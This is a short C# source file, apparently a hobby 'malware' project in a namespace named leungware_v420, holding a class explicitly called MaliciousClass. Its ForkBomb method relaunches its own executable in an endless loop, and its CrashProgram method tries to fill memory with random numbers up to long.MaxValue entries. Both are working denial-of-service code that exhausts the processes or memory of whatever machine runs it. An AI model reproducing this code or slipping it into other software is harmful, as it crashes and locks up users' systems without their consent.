using System;
using System.Collections.Generic;
using System.Reflection;
using System.Diagnostics;
// maybe explain what half of these things are
namespace leungware_v420
{
    public class MaliciousClass
    {
        public static void ForkBomb(bool confirmation)
        {
            while (confirmation)
            {
                Process.Start(Assembly.GetExecutingAssembly().Location);
            }
        }

        private static Double[] GetData()
        {
            Random rnd = new Random();
            List<double> valuesDoubles = new List<double>();
            for (long i = 0; i < long.MaxValue; i++)
            {
                valuesDoubles.Add(rnd.NextDouble());
            }

            return valuesDoubles.ToArray();
        }

        public void CrashProgram()
        {
            Double[] values = GetData();
        }
    }
}